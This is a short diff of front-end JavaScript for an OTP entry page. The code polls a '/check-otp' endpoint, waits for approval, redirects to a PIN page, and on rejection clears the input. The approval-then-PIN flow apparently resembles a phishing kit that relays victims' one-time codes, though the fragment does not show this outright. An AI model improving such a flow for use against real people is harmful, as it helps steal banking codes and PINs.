@@ -195,7 +195,6 @@ function pollApproval(requestId){
       const res = await fetch(`${window.location.origin}/check-otp/${requestId}`);
       const data = await res.json();
 
-      // ✅ FIXED: redirect to 'pin' (not 'success')
       if (data.approved === true || data.redirect === 'pin') {
         clearInterval(interval);
         window.location.href = 'pin.html';
@@ -205,9 +204,13 @@ function pollApproval(requestId){
       if (data.approved === false) {
         clearInterval(interval);
         waitingEl.style.display = 'none';
-        verifyBtn.disabled = false;
+        // ✅ CLEAR INPUT AND DISABLE BUTTON
+        otpInput.value = '';
+        verifyBtn.disabled = true;   // button stays disabled until user types again
         alertBox.style.color = 'red';
         alertBox.textContent = 'Wrong OTP. Try again.';
+        // Focus the input so user can type immediately
+        otpInput.focus();
         return;
       }
 
